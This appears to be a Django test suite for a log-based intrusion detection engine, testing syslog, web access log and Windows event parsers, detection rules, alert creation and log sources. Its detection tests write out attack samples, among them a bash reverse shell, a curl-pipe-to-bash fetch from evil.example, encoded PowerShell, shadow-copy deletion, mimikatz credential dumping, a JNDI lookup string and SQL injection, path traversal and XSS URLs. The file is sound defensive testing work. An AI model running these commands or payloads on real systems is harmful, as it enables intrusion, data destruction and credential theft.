import queue
import socket
import tempfile
import threading
import time
from datetime import timedelta
from pathlib import Path

from django.test import SimpleTestCase, TestCase
from django.utils import timezone

from apps.agentic.models import CaseAnalysisJob
from apps.alerts.models import Alert
from apps.livedetect.engine import DetectionEngine, create_detection_alert
from apps.livedetect.events import (
    LogEvent,
    parse_access_log_line,
    parse_file_line,
    parse_syslog_line,
    parse_windows_event_xml,
)
from apps.livedetect.rules import RULES, RULES_BY_ID
from apps.livedetect.sources import FileTailSource, SyslogSource

T0 = timezone.now().replace(microsecond=0)


def ssh_fail(ip="203.0.113.7", user="root", host="web-01", ts=None):
    event = parse_syslog_line(f"<38>Nov  3 10:00:00 {host} sshd[1234]: Failed password for invalid user {user} from {ip} port 52144 ssh2")
    event.timestamp = ts or T0
    return event


def ssh_ok(ip="203.0.113.7", user="deploy", host="web-01", ts=None):
    event = parse_syslog_line(f"<38>Nov  3 10:01:00 {host} sshd[1234]: Accepted password for {user} from {ip} port 52200 ssh2")
    event.timestamp = ts or T0
    return event


def access(line, ts=None):
    event = parse_access_log_line(line, channel="/var/log/nginx/access.log", default_host="web-01")
    if ts:
        event.timestamp = ts
    return event


WIN_4625 = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>
<Provider Name='Microsoft-Windows-Security-Auditing'/><EventID>4625</EventID>
<TimeCreated SystemTime='2026-11-03T08:00:00.000Z'/><EventRecordID>{rid}</EventRecordID>
<Channel>Security</Channel><Computer>WIN-DC01</Computer></System>
<EventData><Data Name='TargetUserName'>Administrator</Data><Data Name='LogonType'>3</Data>
<Data Name='IpAddress'>198.51.100.23</Data><Data Name='WorkstationName'>KALI</Data></EventData></Event>"""

WIN_1102 = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>
<Provider Name='Microsoft-Windows-Eventlog'/><EventID>1102</EventID>
<TimeCreated SystemTime='2026-11-03T08:05:00.000Z'/><EventRecordID>99</EventRecordID>
<Channel>Security</Channel><Computer>WIN-DC01</Computer></System>
<UserData><LogFileCleared><SubjectUserName>eviladmin</SubjectUserName></LogFileCleared></UserData></Event>"""


class ParserTests(SimpleTestCase):
    def test_rfc3164(self):
        event = parse_syslog_line("<38>Nov  3 10:00:00 web-01 sshd[1234]: Failed password for root from 1.2.3.4 port 1 ssh2")
        self.assertEqual((event.host, event.program, event.fields["pid"]), ("web-01", "sshd", "1234"))
        self.assertTrue(event.message.startswith("Failed password"))

    def test_rfc5424(self):
        event = parse_syslog_line("<34>1 2026-11-03T10:00:00.000Z fw01 kernel - - - IN=eth0 SRC=10.0.0.9 DST=10.0.0.1 DPT=22")
        self.assertEqual((event.host, event.program), ("fw01", "kernel"))
        self.assertEqual(event.timestamp.year, 2026)
        self.assertIn("SRC=10.0.0.9", event.message)

    def test_iso_syslog_file_line(self):
        event = parse_file_line("2026-11-03T10:00:00+05:30 db-01 sudo: pam_unix(sudo:auth): authentication failure; logname=bob uid=1000", channel="/var/log/auth.log")
        self.assertEqual((event.source, event.host, event.program), ("file", "db-01", "sudo"))

    def test_access_log(self):
        event = parse_file_line('203.0.113.9 - - [03/Nov/2026:10:00:00 +0000] "GET /item.php?id=1%27%20UNION%20SELECT%20password HTTP/1.1" 200 512 "-" "sqlmap/1.8"')
        self.assertEqual(event.program, "http")
        self.assertEqual(event.fields["src_ip"], "203.0.113.9")
        self.assertIn("UNION SELECT", event.fields["decoded_url"])

    def test_json_line(self):
        event = parse_file_line('{"@timestamp":"2026-11-03T10:00:00Z","host":{"name":"app-1"},"message":"user login","source":{"ip":"9.9.9.9"}}')
        self.assertEqual((event.host, event.fields["src_ip"]), ("app-1", "9.9.9.9"))

    def test_windows_xml(self):
        event = parse_windows_event_xml(WIN_4625.format(rid=7))
        self.assertEqual((event.event_id, event.host, event.channel), (4625, "WIN-DC01", "Security"))
        self.assertEqual(event.fields["src_ip"], "198.51.100.23")
        self.assertEqual(event.fields["target_user"], "Administrator")
        self.assertEqual(event.fields["record_id"], "7")

    def test_garbage_is_kept_as_message(self):
        event = parse_syslog_line("something odd happened")
        self.assertEqual(event.message, "something odd happened")
        self.assertIsNone(parse_syslog_line("   "))


class RuleEngineTests(SimpleTestCase):
    def setUp(self):
        self.fired = []
        self.engine = DetectionEngine(emit=self.fired.append, cooldown_seconds=600)

    def ids(self):
        return [d.rule.id for d in self.fired]

    def test_rule_ids_unique(self):
        self.assertEqual(len(RULES), len(RULES_BY_ID))

    def test_ssh_bruteforce_needs_threshold_and_fires_once(self):
        for i in range(4):
            self.engine.process(ssh_fail(ts=T0 + timedelta(seconds=i)))
        self.assertEqual(self.fired, [])
        for i in range(4, 12):
            self.engine.process(ssh_fail(ts=T0 + timedelta(seconds=i)))
        self.assertEqual(self.ids(), ["linux.ssh_bruteforce"])
        detection = self.fired[0]
        self.assertEqual(detection.fields["src_ip"], "203.0.113.7")
        self.assertEqual(detection.title, "SSH brute force from 203.0.113.7 against web-01")

    def test_slow_failures_outside_window_do_not_fire(self):
        for i in range(6):
            self.engine.process(ssh_fail(ts=T0 + timedelta(minutes=3 * i)))
        self.assertEqual(self.fired, [])

    def test_cooldown_expires(self):
        for i in range(5):
            self.engine.process(ssh_fail(ts=T0 + timedelta(seconds=i)))
        for i in range(5):
            self.engine.process(ssh_fail(ts=T0 + timedelta(minutes=20, seconds=i)))
        self.assertEqual(self.ids(), ["linux.ssh_bruteforce", "linux.ssh_bruteforce"])

    def test_login_after_bruteforce(self):
        self.engine.process(ssh_ok(ip="198.51.100.1"))  # clean login: no alert
        self.assertEqual(self.fired, [])
        for i in range(3):
            self.engine.process(ssh_fail(ts=T0 + timedelta(seconds=i)))
        self.engine.process(ssh_ok(ts=T0 + timedelta(seconds=10)))
        self.assertEqual(self.ids(), ["linux.ssh_login_after_bruteforce"])
        self.assertEqual(self.fired[0].fields["user"], "deploy")

    def test_port_scan_counts_distinct_ports(self):
        line = "<4>Nov  3 10:00:00 fw01 kernel: [UFW BLOCK] IN=eth0 SRC=192.0.2.50 DST=10.0.0.5 PROTO=TCP SPT=40000 DPT={port}"
        for _ in range(30):  # same port many times is not a scan
            self.engine.process(parse_syslog_line(line.format(port=22)))
        self.assertEqual(self.fired, [])
        for port in range(1000, 1015):
            self.engine.process(parse_syslog_line(line.format(port=port)))
        self.assertEqual(self.ids(), ["network.port_scan"])

    def test_web_attacks(self):
        base = '203.0.113.9 - - [03/Nov/2026:10:00:00 +0000] "GET {url} HTTP/1.1" {status} 10 "-" "{ua}"'
        self.engine.process(access(base.format(url="/index.html", status=200, ua="Mozilla/5.0")))
        self.assertEqual(self.fired, [])
        self.engine.process(access(base.format(url="/p?id=1%20UNION%20SELECT%20user,pass%20FROM%20users", status=200, ua="Mozilla/5.0")))
        self.engine.process(access(base.format(url="/download?f=../../../../etc/passwd", status=200, ua="Mozilla/5.0")))
        self.engine.process(access(base.format(url="/s?q=%3Cscript%3Ealert(1)%3C/script%3E", status=200, ua="Mozilla/5.0")))
        self.engine.process(access(base.format(url="/", status=200, ua="${jndi:ldap://evil/a}")))
        self.engine.process(access(base.format(url="/admin", status=404, ua="Nikto/2.5")))
        self.assertEqual(
            self.ids(),
            ["web.sql_injection", "web.path_traversal", "web.xss", "web.command_injection", "web.scanner_user_agent"],
        )

    def test_windows_bruteforce_and_log_cleared(self):
        for rid in range(1, 6):
            event = parse_windows_event_xml(WIN_4625.format(rid=rid))
            event.timestamp = T0 + timedelta(seconds=rid)
            self.engine.process(event)
        self.engine.process(parse_windows_event_xml(WIN_1102))
        self.assertEqual(self.ids(), ["windows.failed_logon_bruteforce", "windows.audit_log_cleared"])
        self.assertEqual(self.fired[0].fields["src_ip"], "198.51.100.23")

    def test_suspicious_commands(self):
        samples = {
            "command.reverse_shell": "bash -i >& /dev/tcp/10.0.0.66/4444 0>&1",
            "command.download_exec": "curl -s http://evil.example/x.sh | bash",
            "command.encoded_powershell": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
            "command.shadow_copy_delete": "vssadmin.exe delete shadows /all /quiet",
            "command.credential_dumping": "mimikatz.exe sekurlsa::logonpasswords",
        }
        for host, (rule_id, command) in enumerate(samples.items()):
            self.engine.process(LogEvent(source="syslog", message=f"auditd: cmd={command}", host=f"h{host}", program="audit"))
        self.assertEqual(self.ids(), list(samples))

    def test_benign_traffic_is_quiet(self):
        lines = [
            "<38>Nov  3 10:00:00 web-01 sshd[1]: Accepted publickey for deploy from 10.1.1.1 port 1 ssh2",
            "<30>Nov  3 10:00:00 web-01 systemd[1]: Started Daily apt download activities.",
            "<86>Nov  3 10:00:00 web-01 CRON[22]: pam_unix(cron:session): session opened for user root",
            "<38>Nov  3 10:00:00 web-01 sudo:   alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update",
        ]
        for line in lines * 20:
            self.engine.process(parse_syslog_line(line))
        self.assertEqual(self.fired, [])


class AlertCreationTests(TestCase):
    def test_detection_creates_case_alert_artifacts_and_queues_agents(self):
        fired = []
        engine = DetectionEngine(emit=lambda d: fired.append(create_detection_alert(d)))
        for i in range(5):
            engine.process(ssh_fail(ts=T0 + timedelta(seconds=i)))
        self.assertEqual(len(fired), 1)
        case, alert = fired[0].case, fired[0].alert
        self.assertEqual(case.severity, "High")
        self.assertIn("live-detection", case.tags)
        self.assertEqual(alert.rule_id, "linux.ssh_bruteforce")
        self.assertEqual(alert.technique, "T1110.001 - Password Guessing")
        self.assertEqual(len(alert.raw_data["evidence"]), 5)
        values = set(alert.artifacts.values_list("value", flat=True))
        self.assertTrue({"203.0.113.7", "web-01"} <= values)
        self.assertTrue(CaseAnalysisJob.objects.filter(case=case).exists())

    def test_repeat_detection_joins_the_same_case(self):
        engine = DetectionEngine(emit=create_detection_alert, cooldown_seconds=0)
        for i in range(10):
            engine.process(ssh_fail(ts=T0 + timedelta(seconds=i)))
        alerts = Alert.objects.filter(rule_id="linux.ssh_bruteforce")
        self.assertGreater(alerts.count(), 1)
        self.assertEqual(alerts.values("case").distinct().count(), 1)


class SourceTests(SimpleTestCase):
    def _free_port(self):
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            return s.getsockname()[1]

    def _drain(self, q, n, timeout=5):
        items, deadline = [], time.monotonic() + timeout
        while len(items) < n and time.monotonic() < deadline:
            try:
                items.append(q.get(timeout=0.2))
            except queue.Empty:
                pass
        return items

    def test_syslog_udp_and_tcp(self):
        q, stop = queue.Queue(), threading.Event()
        for _attempt in range(10):  # the port must be free for both TCP and UDP
            port = self._free_port()
            try:
                source = SyslogSource(q, stop, host="127.0.0.1", port=port)
                break
            except OSError:
                continue
        source.start()
        try:
            time.sleep(0.3)
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
                udp.sendto(b"<38>Nov  3 10:00:00 udp-host sshd[1]: hello udp", ("127.0.0.1", port))
            with socket.create_connection(("127.0.0.1", port)) as tcp:
                msg = b"<38>Nov  3 10:00:00 tcp-host sshd[1]: framed"
                tcp.sendall(b"<38>Nov  3 10:00:00 tcp-host sshd[1]: line one\n" + str(len(msg)).encode() + b" " + msg)
            events = self._drain(q, 3)
        finally:
            stop.set()
            source.join(timeout=3)
        self.assertEqual(sorted(e.message for e in events), ["framed", "hello udp", "line one"])

    def test_file_tail_follows_new_lines_and_rotation(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "auth.log"
            path.write_text("old line that must be skipped\n")
            q, stop = queue.Queue(), threading.Event()
            source = FileTailSource(q, stop, patterns=[str(path)], poll_seconds=0.05)
            source.start()
            try:
                time.sleep(0.3)
                with path.open("a") as f:
                    f.write("Nov  3 10:00:00 web-01 sshd[1]: first\nNov  3 10:00:00 web-01 sshd[1]: sec")
                    f.flush()
                    time.sleep(0.3)
                    f.write("ond\n")
                first = self._drain(q, 2)
                path.write_text("Nov  3 10:00:00 web-01 sshd[1]: after truncate\n")
                second = self._drain(q, 1)
            finally:
                stop.set()
                source.join(timeout=3)
        self.assertEqual([e.message for e in first], ["first", "second"])
        self.assertEqual([e.message for e in second], ["after truncate"])
